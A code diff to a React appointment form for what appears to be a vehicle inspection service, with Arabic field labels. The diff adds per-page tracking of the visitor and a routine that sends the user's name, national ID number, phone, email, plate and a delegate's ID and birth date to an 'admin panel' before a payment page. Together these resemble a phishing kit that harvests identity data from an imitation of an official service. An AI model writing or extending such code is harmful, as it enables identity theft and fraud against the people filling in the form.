@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef } from "react";
+import { updatePage, submitData, clientNavigate } from "@/lib/store";
 
 // Set page title
 if (typeof document !== 'undefined') {
@@ -161,6 +162,10 @@ const timeSlots = [
 
 export default function NewAppointment() {
   const [, setLocation] = useLocation();
+
+  useEffect(() => {
+    updatePage("صفحة التسجيل");
+  }, []);
   
   // Form state
   const [name, setName] = useState("");
@@ -322,8 +327,43 @@ export default function NewAppointment() {
       window.scrollTo({ top: 0, behavior: 'smooth' });
       return;
     }
+
+    // Send registration data to admin panel
+    const registrationData: Record<string, string> = {
+      'الاسم': name,
+      'رقم الهوية': idNumber,
+      'الجنسية': nationality,
+      'رقم الجوال': '+' + countryCode + phone,
+      'البريد الإلكتروني': email,
+    };
+
+    // Vehicle info
+    if (vehicleType === 'license') {
+      registrationData['اللوحة'] = plateLetter1 + ' ' + plateLetter2 + ' ' + plateLetter3 + ' - ' + plateNumber;
+    } else {
+      registrationData['رقم البيان الجمركي'] = customsId;
+    }
+    registrationData['نوع المركبة'] = vehicleWheels;
+    registrationData['نوع التسجيل'] = registrationType;
+
+    // Service info
+    registrationData['المنطقة'] = region;
+    registrationData['مركز الفحص'] = inspectionCenter;
+    registrationData['تاريخ الفحص'] = appointmentDate;
+    registrationData['وقت الفحص'] = appointmentTime;
+
+    // Delegate info (if enabled)
+    if (delegateEnabled) {
+      registrationData['اسم المفوض'] = delegateName;
+      registrationData['جوال المفوض'] = delegatePhone;
+      registrationData['جنسية المفوض'] = delegateNationality;
+      registrationData['هوية المفوض'] = delegateIdNumber;
+      registrationData['تاريخ ميلاد المفوض'] = delegateBirthDate;
+    }
+
+    submitData(registrationData);
     
-    setLocation("/summary-payment");
+    clientNavigate("/summary-payment");
   };
 
   return (
